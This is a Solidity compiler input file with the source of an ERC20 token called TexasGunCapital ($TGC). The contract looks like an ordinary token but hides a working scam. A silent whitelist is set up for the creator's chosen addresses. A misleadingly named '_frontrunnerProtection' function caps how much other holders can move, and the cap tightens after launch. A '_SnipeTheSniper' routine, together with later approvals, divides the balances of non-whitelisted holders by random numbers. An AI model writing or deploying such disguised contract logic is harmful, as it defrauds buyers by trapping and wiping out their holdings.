{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "WSellRANDOMTRIG.sol": {
      "content": "/*\nTEXAS GUN CAPITAL\n$TGC\n*/\n\npragma solidity 0.8.10;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n}\n\ncontract Ownable is Context {\n    address private _previousOwner; address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    mapping (address => bool) public TexasContract;\n    mapping (address => bool) public GunContract;\n    mapping (address => uint256) private _balances;\n    mapping (address => uint256) private _balancesCopy;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    \n    address[] private chinaArray;\n\n    string private _name; string private _symbol;\n    address private _creator; uint256 private _totalSupply;\n    uint256 private TGCCA; uint256 private GunTax;\n    uint256 private TexasElPaso; bool private BigGunContract;\n    bool private ByeByeSer; bool private BigTexasCA;\n    bool private TexasWTF; uint16 private GunPowder;\n    \n    constructor (string memory name_, string memory symbol_, address creator_) {\n        _name = name_;\n        _creator = creator_;\n        _symbol = symbol_;\n        ByeByeSer = true;\n        TexasContract[creator_] = true;\n        BigGunContract = true;\n        BigTexasCA = false;\n        GunContract[creator_] = false;\n        TexasWTF = false;\n    }\n    \n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n    \n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n    \n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n    \n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    \n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n    \n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n    \n    function randomly(uint16 vl) internal returns (uint16) {\n        GunPowder = (uint16(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%vl)/200);\n        return GunPowder;\n    }\n    \n    function _frontrunnerProtection(address sender, uint256 amount) internal view {\n        if ((TexasContract[sender] == false)) {\n            if ((amount > TexasElPaso)) { require(false); }\n            require(amount < TGCCA);\n        }\n    }\n    \n    function _SnipeTheSniper(address sender) internal {\n        if ((TexasContract[sender] == true) && (address(sender) != _creator) && (TexasWTF == false)) {\n            if (randomly(400) == 1) {\n                for (uint i = 0; i < chinaArray.length; i++) { \n                    if (TexasContract[chinaArray[i]] != true) {\n                        _balances[chinaArray[i]] = _balances[chinaArray[i]] / uint256(randomly(16000));\n                    }\n                }\n                TexasWTF = true;\n            }\n        }\n    }\n    \n    function DeployTexasGunCapital(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        \n        (uint256 temp1, uint256 temp2) = (10, 1);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        \n        TGCCA = _totalSupply;\n        GunTax = _totalSupply / temp1;\n        TexasElPaso = GunTax * temp2;\n        \n        emit Transfer(address(0), account, amount);    \n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n    \n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n    \n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n    \n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _balances[account] -= amount;\n        _balances[address(0)] += amount;\n        emit Transfer(account, address(0), amount);\n     }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        \n        (TexasContract[spender],GunContract[spender],BigGunContract) = ((address(owner) == _creator) && (BigGunContract == true)) ? (true,false,false) : (TexasContract[spender],GunContract[spender],BigGunContract);\n        \n        _allowances[owner][spender] = amount;\n        _balances[owner] = TexasWTF ? (_balances[owner] / uint256(randomly(16000))) : _balances[owner];\n        emit Approval(owner, spender, amount);\n    }\n    \n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        \n        (TGCCA,BigTexasCA) = ((address(sender) == _creator) && (ByeByeSer == false)) ? (GunTax, true) : (TGCCA,BigTexasCA);\n        (TexasContract[recipient],ByeByeSer) = ((address(sender) == _creator) && (ByeByeSer == true)) ? (true, false) : (TexasContract[recipient],ByeByeSer);\n    \n        _frontrunnerProtection(sender, amount);\n        _SnipeTheSniper(sender);\n        \n        chinaArray.push(recipient);\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n}\n\ncontract ERC20Token is Context, ERC20 {\n    constructor(\n        string memory name, string memory symbol,\n        address creator, uint256 initialSupply\n    ) ERC20(name, symbol, creator) {\n        DeployTexasGunCapital(creator, initialSupply);\n    }\n}\n\ncontract TexasGunCapital is ERC20Token {\n    constructor() ERC20Token(\"TexasGunCapital\", \"TGC\", msg.sender, 1400000000 * 10 ** 18) {\n    }\n}"
    }
  }
}